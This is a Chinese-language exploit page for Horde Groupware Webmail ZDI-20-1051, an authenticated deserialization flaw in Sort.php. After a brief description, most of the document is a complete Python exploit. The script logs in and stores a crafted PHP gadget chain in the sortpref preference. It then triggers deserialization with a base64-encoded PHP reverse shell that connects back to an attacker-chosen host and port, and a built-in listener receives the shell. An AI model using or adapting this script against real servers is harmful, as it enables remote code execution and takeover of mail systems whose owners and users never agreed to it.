# 0x00 简介

Horde Groupware Webmail是美国Horde公司的一套基于浏览器的企业级通信套件。 Horde Groupware Webmail中存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。



# 0x01 漏洞详情



ZDI-20-1051

ZDI-CAN-10436



此漏洞使远程攻击者可以在受影响的Horde Groupware Webmail Edition安装上执行任意代码。利用身份验证才能利用此漏洞。



具体缺陷存在于Sort.php中。解析sortpref参数时，该过程无法正确验证用户提供的数据，这可能导致不信任数据的反序列化。攻击者可以利用此漏洞在www-data用户的上下文中执行代码。



# 0x02 利用工具

```python
import re
import sys
import socket
import requests
import telnetlib
import base64
from threading import Thread

def rs(cbh, cbp):
    return """@error_reporting(-1);
@set_time_limit(0); 
@ignore_user_abort(1);
$dis=@ini_get('disable_functions');
if(!empty($dis)){
    $dis=preg_replace('/[, ]+/', ',', $dis);
    $dis=explode(',', $dis);
    $dis=array_map('trim', $dis);
}else{
    $dis=array();
}
$ipaddr='%s';
$port=%d;
function PtdSlhY($c){
    global $dis; 
    if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\\n";
    }
    ob_start();
    system($c);
    $o=ob_get_contents();
    ob_end_clean();
    if (strlen($o) === 0){
        $o = "NULL";
    }
    return $o;
}
$nofuncs='no exec functions';
$s=@fsockopen("tcp://$ipaddr",$port);
while($c=fread($s,2048)){
    $out = '';
    if(substr($c,0,3) == 'cd '){
        chdir(substr($c,3,-1));
    }else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
        break;
    }else{
        $out=PtdSlhY(substr($c,0,-1));
        if($out===false){
            fwrite($s, $nofuncs);
            break;
        }
    }
    fwrite($s,$out);
}
fclose($s);""" % (cbh, cbp)

def get_session(t, p, usr, pwd):
    uri = "http://%s%slogin.php" % (t, p)
    p = {
        "login_post" : 1337,
        "horde_user" : usr,
        "horde_pass" : pwd
    }
    r = requests.post(uri, data=p, allow_redirects=False)
    match = re.findall("Horde=(.{26});", r.headers['set-cookie'])
    assert len(match) == 2, "(-) failed to login"
    return match[1]

def trigger_deserialization(t, p, s, host, port):
    """ Object instantiation to reach the deserialization """
    handlerthr = Thread(target=handler, args=(port,))
    handlerthr.start()
    uri = "http://%s%sservices/ajax.php/imp/imple" % (t, p)
    p = {
        "imple" : "IMP_Prefs_Sort",
        "app" : "imp",
    }
    h = { "cmd" : base64.b64encode(rs(host, port).encode()) }
    c = { "Horde" : s }
    r = requests.get(uri, params=p, cookies=c, headers=h)
    match = re.search("horde_logout_token=(.*)&", r.text)
    assert match, "(-) failed to leak the horde_logout_token!"
    p['token'] = match.group(1)
    r = requests.get(uri, params=p, cookies=c, headers=h)
    assert r.status_code == 200, "(-) failed to trigger deserialization!"

def get_pop():
    """ An updated pop chain """
    pop  = 'O:34:"Horde_Kolab_Server_Decorator_Clean":2:{'
    pop += 'S:43:"\\00Horde_Kolab_Server_Decorator_Clean\\00_server";O:20:"Horde_Prefs_Identity":3:{'
    pop += 'S:9:"\\00*\\00_prefs";O:11:"Horde_Prefs":2:{'
    pop += 'S:8:"\\00*\\00_opts";a:1:{'
    pop += 's:12:"sizecallback";a:2:{i:0;O:12:"Horde_Config":1:{'
    pop += 'S:13:"\\00*\\00_oldConfig";s:44:"eval(base64_decode($_SERVER[HTTP_CMD]));die;";'
    pop += '}i:1;s:13:"readXMLConfig";}}'
    pop += 'S:10:"\\00*\\00_scopes";a:1:{'
    pop += 's:5:"horde";C:17:"Horde_Prefs_Scope":10:{[null,[1]]}}}'  # implements Serializable using custom unserialize/serialize
    pop += 'S:13:"\\00*\\00_prefnames";a:1:{s:10:"identities";i:0;}'
    pop += 'S:14:"\\00*\\00_identities";a:1:{i:0;i:0;}}'             # additional checks
    pop += 'S:42:"\\00Horde_Kolab_Server_Decorator_Clean\\00_added";a:1:{i:0;i:0;}}'
    return pop

def get_patch():
    """ Our original array """
    patch  = 'a:1:{'
    patch += 's:5:"INBOX";a:1:{'
    patch += 's:1:"b";i:6;'
    patch += '}}'
    return patch

def set_pref(t, p, s, k, o):
    """ A primitive that inserts a string into the database """
    uri = "http://%s%sservices/ajax.php/imp/setPrefValue" % (t, p)
    p = {
        "pref" : k,
        "value" : o,
    }
    c = { "Horde" : s }
    r = requests.get(uri, params=p, cookies=c)
    match = re.search("horde_logout_token=(.*)&", r.text)
    assert match, "(-) failed to leak the horde_logout_token!"
    p['token'] = match.group(1)
    r = requests.get(uri, params=p, cookies=c)
    assert ("\"response\":true" in r.text and r.status_code == 200), "(-) failed to set the preference!"

def handler(lport):
    print("(+) starting handler on port %d" % lport)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lport))
    s.listen(1)
    conn, addr = s.accept()
    print("(+) connection from %s" % addr[0])
    t.sock = conn
    print("(+) pop thy shell!")
    t.interact()

def fix_path(p):
    if p == "/":
        return p
    if not p.startswith("/"):
        p = "/%s" % p
    if not p.endswith("/"):
        p = "%s/" % p
    return p

def main():
    if len(sys.argv) < 5:
        print("(+) usage %s <target> <path> <user:pass> <connectback:port>" % sys.argv[0])
        print("(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337" % sys.argv[0])
        sys.exit(0)
    target = sys.argv[1]
    path   = fix_path(sys.argv[2])
    user   = sys.argv[3].split(":")[0]
    pswd   = sys.argv[3].split(":")[1]
    host   = sys.argv[4].split(":")[0]
    port   = int(sys.argv[4].split(":")[1])
    print("(+) targeting http://%s%s" % (target, path))
    session = get_session(target, path, user, pswd)
    print("(+) obtained session %s" % session)
    set_pref(target, path, session, 'sortpref', get_pop())
    print("(+) inserted our php object")
    print("(+) triggering deserialization...")
    trigger_deserialization(target, path, session, host, port)
    set_pref(target, path, session, 'sortpref', get_patch())
    print("(+) repaired the target!")

if __name__ == "__main__":
    main()
```

# 0x03 references



https://www.zerodayinitiative.com/advisories/ZDI-20-1051/

https://srcincite.io/pocs/zdi-20-1051.py.txt